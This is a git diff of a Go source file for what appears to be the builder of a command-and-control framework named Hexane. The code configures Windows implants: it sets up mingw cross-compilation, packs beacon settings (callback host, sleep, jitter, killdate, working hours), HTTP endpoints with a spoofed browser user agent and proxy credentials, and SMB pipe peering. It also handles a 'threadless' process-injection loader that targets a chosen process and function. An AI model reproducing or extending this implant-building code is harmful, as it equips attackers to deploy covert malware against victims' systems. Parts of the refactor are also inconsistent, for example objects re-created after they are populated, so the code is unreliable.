@@ -1,7 +1,6 @@
 package core
 
 import (
-	"encoding/json"
 	"fmt"
 	"os"
 	"strings"
@@ -21,9 +20,8 @@ var (
 )
 
 var (
-	FstatCreate = os.O_WRONLY | os.O_CREATE | os.O_TRUNC
-	FstatWrite  = os.O_WRONLY | os.O_APPEND
-	FstatRW     = os.O_RDWR | os.O_APPEND
+	FstatRW   = os.O_RDWR | os.O_APPEND
+	Useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
 )
 
 var ModuleStrings = []string{
@@ -35,7 +33,7 @@ var ModuleStrings = []string{
 
 func (h *HexaneConfig) GetTransportType() (string, error) {
 
-	switch h.ImplantCFG.ProfileTypeId {
+	switch h.Implant.ProfileTypeId {
 	case TRANSPORT_HTTP:
 		return "TRANSPORT_HTTP", nil
 	case TRANSPORT_PIPE:
@@ -46,14 +44,17 @@ func (h *HexaneConfig) GetTransportType() (string, error) {
 }
 
 func (h *HexaneConfig) GetEmbededStrings(strList []string) []byte {
-	var stream = new(Stream)
 
+	stream := new(Stream)
 	stream.PackString(string(h.Key))
 
-	if h.ImplantCFG.ProfileTypeId == TRANSPORT_HTTP {
+	switch h.Implant.ProfileTypeId {
+	case TRANSPORT_HTTP:
 		stream.PackDword(1)
-	} else if h.ImplantCFG.ProfileTypeId == TRANSPORT_PIPE {
+	case TRANSPORT_PIPE:
 		stream.PackDword(0)
+	default:
+		return nil
 	}
 
 	stream.PackDword(1) // Ctx->LE == TRUE
@@ -65,60 +66,43 @@ func (h *HexaneConfig) GetEmbededStrings(strList []string) []byte {
 	return stream.Buffer
 }
 
-func GetModuleConfig(cfgName string) (*JsonObject, error) {
+func (h *HexaneConfig) GenerateConfigBytes() error {
 	var (
-		err    error
-		buffer []byte
-		module *JsonObject
+		err   error
+		patch []byte
 	)
 
-	if buffer, err = os.ReadFile(cfgName); err != nil {
-		return nil, err
-	}
-
-	if err = json.Unmarshal(buffer, &module); err != nil {
-		return nil, err
-	}
-
-	module.ConfigName = cfgName
-	module.IncludeDirectories = append(module.IncludeDirectories, RootDirectory)
-
-	return module, nil
-}
-
-func (h *HexaneConfig) GenerateConfigBytes() error {
 	key := CryptCreateKey(16)
-	patch, err := h.PePatchConfig()
-	if err != nil {
+	if patch, err = h.PePatchConfig(); err != nil {
 		return err
 	}
 
 	h.Key = key
 	h.ConfigBytes = patch // Assuming XteaCrypt(patch) if needed.
+
 	return nil
 }
 
-func (h *HexaneConfig) CreateConfig(jsonCfg Json) error {
-	var err error
+func (h *HexaneConfig) CreateConfig(jsonCfg *JsonConfig) {
 
-	h.CompilerCFG = new(CompilerConfig)
-	h.ImplantCFG = new(ImplantConfig)
-	WrapMessage("INF", fmt.Sprintf("generating config for %s", h.CompilerCFG.FileExtension))
+	WrapMessage("INF", "generating config for "+h.Compiler.FileExtension)
 
-	h.Config.ImplantName = jsonCfg.ImplantName
-	h.CompilerCFG.BuildDirectory = fmt.Sprintf("../payload/%s", strings.TrimSuffix(h.ImplantName, h.CompilerCFG.FileExtension))
+	h.Compiler = new(Compiler)
+	h.Implant = new(Implant)
 
-	h.CompilerCFG.Debug = jsonCfg.Config.Debug
-	h.CompilerCFG.Arch = jsonCfg.Config.Arch
-	h.CompilerCFG.Ar = "/usr/bin/x86_64-w64-mingw32-ar"
-	h.CompilerCFG.Mingw = "/usr/bin/x86_64-w64-mingw32-g++"
-	h.CompilerCFG.Linker = "/usr/bin/x86_64-w64-mingw32-ld"
-	h.CompilerCFG.Objcopy = "/usr/bin/x86_64-w64-mingw32-objcopy"
-	h.CompilerCFG.Windres = "/usr/bin/x86_64-w64-mingw32-windres"
-	h.CompilerCFG.Strip = "/usr/bin/x86_64-w64-mingw32-strip"
-	h.CompilerCFG.Assembler = "/usr/bin/nasm"
+	h.Implant.ImplantName = jsonCfg.Builder.OutputName
+	h.Compiler.BuildDirectory = fmt.Sprintf("../payload/%s", strings.TrimSuffix(h.Implant.ImplantName, h.Compiler.FileExtension))
 
-	h.ImplantCFG.LoadedModules = []string{
+	h.Compiler.Debug = jsonCfg.Config.Debug
+	h.Compiler.Arch = jsonCfg.Config.Arch
+	h.Compiler.Mingw = "/usr/bin/x86_64-w64-mingw32-g++"
+	h.Compiler.Linker = "/usr/bin/x86_64-w64-mingw32-ld"
+	h.Compiler.Objcopy = "/usr/bin/x86_64-w64-mingw32-objcopy"
+	h.Compiler.Windres = "/usr/bin/x86_64-w64-mingw32-windres"
+	h.Compiler.Strip = "/usr/bin/x86_64-w64-mingw32-strip"
+	h.Compiler.Assembler = "/usr/bin/nasm"
+
+	h.Implant.LoadedModules = []string{
 		"crypt32",
 		"winhttp",
 		"advapi32",
@@ -127,7 +111,7 @@ func (h *HexaneConfig) CreateConfig(jsonCfg Json) error {
 	}
 
 	if jsonCfg.Config.Debug {
-		h.CompilerCFG.Flags = []string{
+		h.Compiler.Flags = []string{
 			"",
 			"-std=c++23",
 			"-g -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel",
@@ -137,7 +121,7 @@ func (h *HexaneConfig) CreateConfig(jsonCfg Json) error {
 			"-Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections",
 		}
 	} else {
-		h.CompilerCFG.Flags = []string{
+		h.Compiler.Flags = []string{
 			"",
 			"-std=c++23",
 			"-Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel",
@@ -147,103 +131,176 @@ func (h *HexaneConfig) CreateConfig(jsonCfg Json) error {
 			"-Wl,--no-seh,--enable-stdcall-fixup,--gc-sections",
 		}
 	}
-
-	return err
 }
 
-func ReadConfig(cfgName string) error {
+func ReadConfig(cfgPath string) error {
 	var (
-		jsn    Json
-		buffer []byte
-		err    error
+		err error
+		j   *JsonConfig
+		h   *HexaneConfig
 	)
 
-	hexane := new(HexaneConfig)
+	WrapMessage("INF", fmt.Sprintf("loading %s", cfgPath))
 
-	WrapMessage("INF", fmt.Sprintf("loading %s", cfgName))
-	if buffer, err = os.ReadFile(RootDirectory + "json/" + cfgName); err != nil {
+	h = new(HexaneConfig)
+	h.Network = new(Network)
+
+	if j = ReadJson(cfgPath); j == nil {
+		return fmt.Errorf("%s not found", cfgPath)
+	}
+
+	h.CreateConfig(j)
+	h.PeerId = GeneratePeerId()
+	h.Implant.Sleeptime = uint32(j.Config.Sleeptime)
+	h.Implant.Jitter = uint32(j.Config.Jitter)
+	if h.Implant.WorkingHours, err = ParseWorkingHours(j.Config.WorkingHours); err != nil {
 		return err
 	}
-
-	if err = json.Unmarshal(buffer, &jsn); err != nil {
-		return err
+	if h.Implant.Hostname = j.Config.Hostname; h.Implant.Hostname == "" {
+		return fmt.Errorf("config:: - a hostname must be provided")
 	}
 
-	if err = hexane.CreateConfig(jsn); err != nil {
-		return err
-	}
-
-	hexane.PeerId = GeneratePeerId()
-	hexane.ImplantCFG.Sleeptime = uint32(jsn.Config.Sleeptime)
-	hexane.ImplantCFG.Jitter = uint32(jsn.Config.Jitter)
-
-	if hexane.ImplantCFG.Hostname = jsn.Config.Hostname; hexane.ImplantCFG.Hostname == "" {
-		return fmt.Errorf("a hostname must be provided")
-	}
-
-	switch jsn.Network.ProfileType {
+	switch j.Network.ProfileType {
 	case "http":
+		// Handle, SigTerm, Success and Next are added later
+		h.Network.Config = new(Http)
+
+		hNet := h.Network.Config.(*Http)
+		jNet := j.Network.Config.(*Http)
+
+		hNet.Domain = jNet.Domain
+		if hNet.Address = jNet.Address; hNet.Address == "" {
+			return fmt.Errorf("network::http - ip address must be specified")
+		}
+		if hNet.Port = jNet.Port; hNet.Port > 65535 || hNet.Port < 1 {
+			return fmt.Errorf("network::http - invalid tcp port %d", hNet.Port)
+		}
+		if jNet.Endpoints != nil {
+			hNet.Endpoints = append(hNet.Endpoints, jNet.Endpoints...)
+		} else {
+			return fmt.Errorf("network::http - at least 1 http endpoint must be specified")
+		}
+
+		if hNet.Useragent = jNet.Useragent; hNet.Useragent == "" {
+			hNet.Useragent = Useragent
+		}
+		if jNet.Headers != nil {
+			hNet.Headers = append(hNet.Headers, jNet.Headers...)
+		}
+
+		if jNet.Proxy != nil {
+			hNet.Proxy = new(Proxy)
+
+			hNet.Proxy.Address = jNet.Proxy.Address
+			hNet.Proxy.Username = jNet.Proxy.Username
+			hNet.Proxy.Password = jNet.Proxy.Password
+			hNet.Proxy.Port = jNet.Proxy.Port
+		}
+
 	case "smb":
+		// IngressPeer and all pipe names are added later
+		h.Network.Config = new(Smb)
+
+		netConfig := h.Network.Config.(*Smb)
+		jNet := j.Network.Config.(*Smb)
+
+		if jNet.EgressPeer != "" {
+			netConfig.EgressPeer = jNet.EgressPeer
+		} else {
+			return fmt.Errorf("network::smb - peer must have it's parent node name specified")
+		}
+
 	default:
-		return fmt.Errorf("unknown network profile type")
+		return fmt.Errorf("network:: - unknown network profile type")
 	}
 
-	if jsn.Builder != nil {
-		if jsn.Builder.Loader != nil {
+	h.Implant = new(Implant)
+	h.Compiler = new(Compiler)
+
+	implant := h.Implant
+	compiler := h.Compiler
+
+	if j.Builder != nil {
+		implant.ImplantName = j.Builder.OutputName
+		compiler.RootDirectory = j.Builder.RootDirectory
+		compiler.LinkerScript = j.Builder.LinkerScript
+
+		if j.Builder.Objects.Sources != nil {
+			compiler.Sources = append(compiler.Sources, j.Builder.Objects.Sources...)
+		} else {
+			return fmt.Errorf("implant::builder - builder must specify source files")
+		}
+
+		if implant.Loader != nil {
+			implant.Loader.InjectionType = j.Builder.Loader.InjectionType
+			implant.Loader.LinkerScript = j.Builder.Loader.LinkerScript
+			implant.Loader.MainFile = j.Builder.Loader.MainFile
+
+			switch implant.Loader.InjectionType {
+			case "threadless":
+				threadless := implant.Loader.Config.(*Threadless)
+				jConfig := j.Builder.Loader.Config.(*Threadless)
+
+				threadless = new(Threadless)
+				threadless.TargetProc = jConfig.TargetProc
+				threadless.TargetModule = jConfig.TargetModule
+				threadless.TargetFunc = jConfig.TargetFunc
+				threadless.LoaderAsm = jConfig.LoaderAsm
+				threadless.Execute = jConfig.Execute
+
+			default:
+				return fmt.Errorf("implant::loader - unknown injection method")
+			}
 		}
 	} else {
-		return fmt.Errorf("a build definition needs to be provided")
+		return fmt.Errorf("implant::builder - a build definition needs to be provided")
 	}
 
-	hexane.UserSession = Session
-	return hexane.RunBuild()
+	h.UserSession = Session
+	return h.RunBuild()
 }
 
 func (h *HexaneConfig) PePatchConfig() ([]byte, error) {
-	var (
-		stream = CreateStream()
-		Hours  int32
-		err    error
-	)
+	var err error
 
-	if Hours, err = ParseWorkingHours(h.ImplantCFG.WorkingHours); err != nil {
-		return nil, err
-	}
+	stream := CreateStream()
+	implant := h.Implant
 
 	stream.PackDword(h.PeerId)
-	stream.PackInt32(Hours)
-	stream.PackString(h.ImplantCFG.Hostname)
-	stream.PackString(h.ImplantCFG.Domain)
-	stream.PackDword(h.ImplantCFG.Sleeptime)
-	stream.PackDword(h.ImplantCFG.Jitter)
-	stream.PackDword64(h.ImplantCFG.Killdate)
+	stream.PackString(implant.Hostname)
+	stream.PackDword(implant.Sleeptime)
+	stream.PackDword(implant.Jitter)
+	stream.PackDword64(implant.Killdate)
+	stream.PackInt32(implant.WorkingHours)
 
-	switch h.ImplantCFG.ProfileTypeId {
+	switch implant.ProfileTypeId {
 	case TRANSPORT_HTTP:
 		{
-			var httpCfg = h.ImplantCFG.Profile.(*HttpConfig)
+			hNet := h.Network.Config.(*Http)
 
-			stream.PackWString(httpCfg.Useragent)
-			stream.PackWString(httpCfg.Address)
-			stream.PackDword(uint32(httpCfg.Port))
+			stream.PackWString(hNet.Useragent)
+			stream.PackWString(hNet.Address)
+			stream.PackString(hNet.Domain)
+			stream.PackDword(uint32(hNet.Port))
 
-			if len(httpCfg.Endpoints) == 0 {
+			if len(hNet.Endpoints) == 0 {
 				stream.PackDword(1)
 				stream.PackWString("/")
 
 			} else {
-				stream.PackDword(uint32(len(httpCfg.Endpoints)))
-				for _, uri := range httpCfg.Endpoints {
+				stream.PackDword(uint32(len(hNet.Endpoints)))
+				for _, uri := range hNet.Endpoints {
 					stream.PackWString(uri)
 				}
 			}
-			if h.ImplantCFG.ProxyBool {
-				var proxyUrl = fmt.Sprintf("%v://%v:%v", h.ProxyCFG.Proto, h.ProxyCFG.Address, h.ProxyCFG.Port)
+
+			if hNet.Proxy != nil {
+				proxyUrl := fmt.Sprintf("%v://%v:%v", h.Proxy.Proto, h.Proxy.Address, h.Proxy.Port)
 
 				stream.PackDword(1)
 				stream.PackWString(proxyUrl)
-				stream.PackWString(h.ProxyCFG.Username)
-				stream.PackWString(h.ProxyCFG.Password)
+				stream.PackWString(h.Proxy.Username)
+				stream.PackWString(h.Proxy.Password)
 
 			} else {
 				stream.PackDword(0)
@@ -253,7 +310,8 @@ func (h *HexaneConfig) PePatchConfig() ([]byte, error) {
 		}
 	case TRANSPORT_PIPE:
 		{
-			stream.PackWString(h.ServerCFG.)
+			hNet := h.Network.Config.(*Smb)
+			stream.PackWString(hNet.EgressPipename)
 		}
 	}
 	return stream.Buffer, err
